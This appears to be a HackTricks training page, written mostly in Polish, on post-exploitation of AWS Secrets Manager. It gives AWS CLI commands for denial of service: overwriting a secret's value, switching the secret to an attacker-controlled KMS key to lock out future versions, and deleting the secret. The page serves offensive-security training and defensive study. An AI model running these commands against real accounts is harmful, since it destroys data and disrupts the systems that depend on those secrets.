# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

Po więcej informacji sprawdź:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Odczyt sekretów

The **secrets themself are sensitive information**, [sprawdź stronę privesc](../aws-privilege-escalation/aws-secrets-manager-privesc.md) aby dowiedzieć się, jak je odczytać.

### DoS — zmiana wartości sekretu

Zmieniając wartość sekretu możesz **spowodować DoS wszystkich systemów, które zależą od tej wartości.**

> [!WARNING]
> Zauważ, że poprzednie wartości są również przechowywane, więc łatwo jest po prostu wrócić do poprzedniej wartości.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Jeśli attacker ma uprawnienie secretsmanager:UpdateSecret, może skonfigurować secret tak, aby używał KMS key należącego do attacker. Ten KMS key jest początkowo ustawiony w taki sposób, że każdy może go używać i mieć do niego dostęp, więc możliwe jest zaktualizowanie secret z nowym KMS key. Gdyby KMS key nie był dostępny, secret nie mógłby zostać zaktualizowany.

Po zmianie KMS key dla secret attacker modyfikuje konfigurację swojego KMS key tak, aby dostęp do niego miał tylko attacker. W ten sposób w kolejnych wersjach secret będzie szyfrowany nowym KMS key, a ponieważ nie będzie do niego dostępu, możliwość odzyskania secret zostanie utracona.

Ważne jest, aby zaznaczyć, że ta niedostępność wystąpi dopiero w późniejszych wersjach, po zmianie zawartości secret, ponieważ bieżąca wersja nadal jest zaszyfrowana oryginalnym KMS key.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Usuwanie secretu

Minimalna liczba dni wymagana do usunięcia secretu to 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
{{#include ../../../banners/hacktricks-training.md}}
